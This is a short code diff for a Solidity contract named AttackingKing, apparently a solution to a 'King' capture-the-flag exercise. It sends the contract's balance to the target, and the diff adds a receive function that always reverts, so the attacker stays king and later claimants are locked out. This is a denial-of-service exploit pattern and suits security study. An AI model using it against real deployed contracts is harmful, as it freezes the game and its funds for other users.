@@ -14,12 +14,10 @@ contract AttackingKing {
     function hackContract() external payable {
         // Code me!
 
-        // payable(contractAddress).transfer(address(this).balance);
-        // address payable _to = payable(contractAddress);
-        // bool sent = _to.send(address(this).balance);
-        // // require(sent, "Failed to send Ether");
-
         (bool sent,) =  payable(contractAddress).call{value: address(this).balance}("");
         require(sent, "Failed to send the funds");
     }
+   receive() external payable {
+         revert("I shall remain the king forever");
+        }
 }
